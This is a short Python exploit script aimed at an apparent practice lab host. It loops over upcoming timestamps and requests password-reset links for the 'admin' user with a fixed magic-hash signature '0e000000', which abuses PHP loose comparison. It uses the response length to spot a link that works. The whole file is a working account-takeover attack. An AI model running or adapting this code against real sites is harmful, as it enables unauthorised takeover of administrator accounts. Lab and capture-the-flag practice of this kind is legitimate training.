# source : http://hackme13.vulnmachines.com:9999/Forget.php

import sys, requests, time
ti = time.time()

# length of a non-working password reset link response is 1134
# def reset_link(target):
#     time = int(ti)
#     link = "http://"+target+"/Reset.php?user=admin&time=%s&sig=0e000000" % time
#     r = requests.get(link)
#     print("The lenght of a non-working password reset link is: %s" % len(r.content))

# def main():
#     if len(sys.argv) != 2:
#         print("Usage: %s <target>" % sys.argv[0])
#         sys.exit()
#     target = sys.argv[1]
#     print("Trying to get the length of non-working rest password link")
#     reset_link(target)

# main()
length = 1134
tii = int(ti)

for i in range(10000):
    tii += 1
    link = "http://hackme13.vulnmachines.com:9999/Reset.php?user=admin&time=%s&sig=0e000000" % tii
    r = requests.get(link)
    if len(r.content) != length:
        print(link)
        print(r.content)
        break

